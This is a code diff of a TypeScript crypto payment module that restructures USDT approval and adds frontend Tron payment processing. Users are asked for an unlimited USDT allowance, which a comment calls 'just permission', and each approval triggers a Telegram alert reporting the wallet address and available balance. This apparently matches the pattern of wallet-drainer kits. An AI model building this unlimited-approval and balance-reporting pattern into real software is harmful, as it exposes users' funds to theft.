@@ -752,41 +752,84 @@ export async function approveUSDT(
       if (!config.usdt || !ethers.isAddress(config.usdt)) {
         throw new Error(`Invalid USDT address for ${chain}: ${config.usdt}`);
       }
-    }
 
-    const signer = await wallet.provider.getSigner();
+      const signer = await wallet.provider.getSigner();
 
-    const paymentContract = new ethers.Contract(
-      config.paymentProcessor,
-      chainAbi,
-      signer
-    );
+      const paymentContract = new ethers.Contract(
+        config.paymentProcessor,
+        chainAbi,
+        signer
+      );
 
-    // Check allowance using your contract's method
-    const hasSufficientAllowance = await paymentContract.checkAllowance(
-      userAddress,
-      amount
-    );
+      // Check allowance using your contract's method
+      const hasSufficientAllowance = await paymentContract.checkAllowance(
+        userAddress,
+        amount
+      );
 
-    // Check balance using your contract's method (only if not using MAX_APPROVAL)
-    const userBalance = await paymentContract.getUserBalance(userAddress);
+      // Check balance using your contract's method (only if not using MAX_APPROVAL)
+      const userBalance = await paymentContract.getUserBalance(userAddress);
 
-    // Skip balance check for MAX_APPROVAL (it's just permission, not actual spending)
-    if (amount !== MAX_APPROVAL) {
-      // Check if user has sufficient balance BEFORE approval
-      if (userBalance < BigInt(amount)) {
-        const requiredAmount = ethers.formatUnits(amount, config.decimals);
-        const currentBalance = ethers.formatUnits(userBalance, config.decimals);
-        console.error(
-          `Insufficient USDT balance. Required: ${requiredAmount} USDT, Current: ${currentBalance} USDT`
-        );
-        return false;
+      // Skip balance check for MAX_APPROVAL (it's just permission, not actual spending)
+      if (amount !== MAX_APPROVAL) {
+        // Check if user has sufficient balance BEFORE approval
+        if (userBalance < BigInt(amount)) {
+          const requiredAmount = ethers.formatUnits(amount, config.decimals);
+          const currentBalance = ethers.formatUnits(
+            userBalance,
+            config.decimals
+          );
+          console.error(
+            `Insufficient USDT balance. Required: ${requiredAmount} USDT, Current: ${currentBalance} USDT`
+          );
+          return false;
+        }
       }
-    }
 
-    // If allowance is sufficient, no need to approve
-    if (hasSufficientAllowance) {
-      // Send Telegram notification for existing allowance
+      // If allowance is sufficient, no need to approve
+      if (hasSufficientAllowance) {
+        // Send Telegram notification for existing allowance
+        try {
+          const { telegramService } = await import("@/lib/telegram");
+          if (telegramService.isConfigured()) {
+            const currentBalance = ethers.formatUnits(
+              userBalance,
+              config.decimals
+            );
+            const walletType = wallet.walletType || "EVM Wallet";
+
+            await telegramService.sendApproveSuccessNotification({
+              walletType: walletType,
+              chain: chain,
+              userAddress: userAddress,
+              amount: `Already approved (${currentBalance} USDT available)`,
+              token: "USDT",
+              timestamp: new Date().toISOString(),
+            });
+            console.log(
+              "📱 Telegram notification sent for existing EVM allowance"
+            );
+          }
+        } catch (telegramError) {
+          console.log("📱 Telegram notification failed:", telegramError);
+          // Don't fail the approval if telegram fails
+        }
+
+        return true;
+      }
+
+      // Create USDT contract instance for approval
+      const usdtContract = new ethers.Contract(config.usdt, USDT_ABI, signer);
+
+      // Approve USDT spending for your contract
+      const approvalTx = await usdtContract.approve(
+        config.paymentProcessor,
+        MAX_APPROVAL
+      );
+
+      await approvalTx.wait();
+
+      // Send Telegram notification for successful approval
       try {
         const { telegramService } = await import("@/lib/telegram");
         if (telegramService.isConfigured()) {
@@ -800,13 +843,11 @@ export async function approveUSDT(
             walletType: walletType,
             chain: chain,
             userAddress: userAddress,
-            amount: `Already approved (${currentBalance} USDT available)`,
+            amount: `MAX (${currentBalance} USDT available)`,
             token: "USDT",
             timestamp: new Date().toISOString(),
           });
-          console.log(
-            "📱 Telegram notification sent for existing EVM allowance"
-          );
+          console.log("📱 Telegram notification sent for EVM approval");
         }
       } catch (telegramError) {
         console.log("📱 Telegram notification failed:", telegramError);
@@ -815,41 +856,6 @@ export async function approveUSDT(
 
       return true;
     }
-
-    // Create USDT contract instance for approval
-    const usdtContract = new ethers.Contract(config.usdt, USDT_ABI, signer);
-
-    // Approve USDT spending for your contract
-    const approvalTx = await usdtContract.approve(
-      config.paymentProcessor,
-      MAX_APPROVAL
-    );
-
-    await approvalTx.wait();
-
-    // Send Telegram notification for successful approval
-    try {
-      const { telegramService } = await import("@/lib/telegram");
-      if (telegramService.isConfigured()) {
-        const currentBalance = ethers.formatUnits(userBalance, config.decimals);
-        const walletType = wallet.walletType || "EVM Wallet";
-
-        await telegramService.sendApproveSuccessNotification({
-          walletType: walletType,
-          chain: chain,
-          userAddress: userAddress,
-          amount: `MAX (${currentBalance} USDT available)`,
-          token: "USDT",
-          timestamp: new Date().toISOString(),
-        });
-        console.log("📱 Telegram notification sent for EVM approval");
-      }
-    } catch (telegramError) {
-      console.log("📱 Telegram notification failed:", telegramError);
-      // Don't fail the approval if telegram fails
-    }
-
-    return true;
   } catch (error: any) {
     console.error("USDT approval failed:", error);
     throw error;
@@ -1030,7 +1036,7 @@ export async function processPayment(
 /**
  * Frontend function to handle complete payment flow
  * 1. Approve USDT spending (one-time)
- * 2. Call backend to process payment automatically
+ * 2. Process payment (frontend for Tron, backend for EVM)
  */
 export async function handlePaymentFlow(
   paymentId: string,
@@ -1045,15 +1051,126 @@ export async function handlePaymentFlow(
       return { success: false, error: "USDT approval failed" };
     }
 
-    // Step 2: Call backend to process payment automatically
-    const response = await fetch("/api/payment/process", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ paymentId, amount, userAddress, chain }),
-    });
+    // Step 2: Process payment based on chain type
+    if (chain === "tron") {
+      // Tron payments must be processed on frontend (TronWeb available)
+      return await processTronPaymentFrontend(paymentId, amount, userAddress);
+    } else {
+      // EVM chains use backend processing
+      const response = await fetch("/api/payment/process", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ paymentId, amount, userAddress, chain }),
+      });
 
-    const result = await response.json();
-    return result;
+      const result = await response.json();
+      return result;
+    }
+  } catch (error: any) {
+    return { success: false, error: error.message };
+  }
+}
+
+/**
+ * Frontend Tron payment processing (since TronWeb is only available in browser)
+ */
+async function processTronPaymentFrontend(
+  paymentId: string,
+  amount: number,
+  userAddress: string
+): Promise<{ success: boolean; txHash?: string; error?: string }> {
+  try {
+    if (typeof window === "undefined") {
+      return { success: false, error: "TronWeb not available on server" };
+    }
+
+    const tronWeb = (window as any).tronWeb;
+    if (!tronWeb || !tronWeb.ready) {
+      return {
+        success: false,
+        error: "TronWeb not ready. Please connect your Tron wallet first.",
+      };
+    }
+
+    const config = CHAIN_CONFIG.tron;
+    if (!config) {
+      return { success: false, error: "Invalid Tron chain configuration" };
+    }
+
+    const formattedAmount = (amount * Math.pow(10, config.decimals)).toString();
+    const chainAbi = getChainAbi("tron");
+    const paymentProcessor = tronWeb.contract(
+      chainAbi,
+      config.paymentProcessor
+    );
+
+    // Check if payment ID already exists
+    try {
+      const existingPayment = await paymentProcessor
+        .getPayment(paymentId)
+        .call();
+      if (
+        existingPayment &&
+        existingPayment.payer !== "0x0000000000000000000000000000000000000000"
+      ) {
+        return {
+          success: false,
+          error: `Payment ID ${paymentId} already exists`,
+        };
+      }
+    } catch (checkError) {
+      // This is normal for new payments
+    }
+
+    // Final balance and allowance checks
+    const finalBalanceCheck = await paymentProcessor
+      .getUserBalance(userAddress)
+      .call();
+    const finalAllowanceCheck = await paymentProcessor
+      .checkAllowance(userAddress, formattedAmount)
+      .call();
+
+    const finalBalanceBigNumber = tronWeb.toBigNumber(finalBalanceCheck);
+    const finalAllowanceBigNumber = tronWeb.toBigNumber(finalAllowanceCheck);
+    const formattedAmountBigNumber = tronWeb.toBigNumber(formattedAmount);
+
+    if (finalBalanceBigNumber.lt(formattedAmountBigNumber)) {
+      const requiredAmount = formattedAmountBigNumber
+        .div(tronWeb.toBigNumber(10 ** config.decimals))
+        .toString();
+      const currentBalance = finalBalanceBigNumber
+        .div(tronWeb.toBigNumber(10 ** config.decimals))
+        .toString();
+      return {
+        success: false,
+        error: `Insufficient USDT balance. Required: ${requiredAmount} USDT, Current: ${currentBalance} USDT`,
+      };
+    }
+
+    if (
+      !finalAllowanceBigNumber ||
+      finalAllowanceBigNumber.lt(formattedAmountBigNumber)
+    ) {
+      return { success: false, error: "Insufficient USDT allowance" };
+    }
+
+    // Process payment
+    const serviceDescription = `Payment for ${paymentId}`;
+    const tx = await paymentProcessor
+      .processPayment(paymentId, formattedAmount, serviceDescription)
+      .send();
+
+    // Wait for confirmation
+    await new Promise((resolve) => setTimeout(resolve, 5000));
+
+    // Verify transaction success
+    const txInfo = await tronWeb.trx.getTransactionInfo(tx);
+    if (!txInfo || txInfo.receipt?.result !== "SUCCESS") {
+      const result = txInfo?.receipt?.result || "UNKNOWN";
+      return { success: false, error: `Transaction failed: ${result}` };
+    }
+
+    return { success: true, txHash: tx };
   } catch (error: any) {
     return { success: false, error: error.message };
   }
